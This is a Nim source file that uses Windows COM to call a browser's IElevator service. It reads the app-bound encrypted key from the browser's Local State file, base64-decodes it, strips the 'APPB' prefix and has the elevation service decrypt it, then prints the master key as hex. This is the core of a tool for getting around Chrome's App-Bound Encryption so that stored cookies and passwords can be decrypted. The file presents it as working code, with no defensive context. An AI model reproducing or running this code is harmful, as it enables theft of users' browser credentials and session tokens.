import winim/mean, ./types, ./config
import std/os, std/json, std/base64, std/strutils, ptr_math

proc initCOM*(): bool =
    return not FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))

proc initElevator*(clsid: CLSID, iid: IID): ptr IElevator =
    var elev: ptr IElevator
    var hRes = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &iid, cast[ptr LPVOID](&elev))

    if FAILED(hRes):
        return NULL
    else:
        return elev

proc setProxyBlanket*(elev: ptr IElevator): bool =

    return not FAILED(CoSetProxyBlanket(
        cast[ptr IUnknown](elev),
        cast[DWORD](0xFFFFFFFF),
        cast[DWORD](0xffffffff),
        COLE_DEFAULT_PRINCIPAL,
        cast[DWORD](6),
        cast[DWORD](3),
        cast[RPC_AUTH_IDENTITY_HANDLE](NULL),
        EOAC_DYNAMIC_CLOAKING))

proc getAppBoundKeyDecoded*(localStatePath: string): string =
    var content = parseJson(readFile(localStatePath))
    var abKey = content["os_crypt"]["app_bound_encrypted_key"]

    return decode(abKey.str).split("APPB")[1]

proc getAppData*(): string = 
    return os.getEnv("localappdata")

proc allocCipherTextData*(decodedKey: string): BSTR =
    return SysAllocStringByteLen(decodedKey, cast[UINT](len(decodedKey)))

proc decryptKeyData*(elevator: ptr IElevator, cipherData: BSTR): PBYTE =
    var plaintext: BSTR
    var lastError: DWORD = 0

    var hr = elevator.DecryptData(cipherData, &plaintext, &lastError)

    if FAILED(hr):
        return NULL
    else:

        var key = HeapAlloc(GetProcessHeap(), 0, KEY_SIZE)
        copyMem(key, cast[LPVOID](plaintext), KEY_SIZE)
        return cast[PBYTE](key)

    
proc toString*(keyPtr: PBYTE): string =
    for i in 0..KEY_SIZE - 1:
        var letter = keyPtr[i]
        result.add(strutils.toHex(letter).toLower())
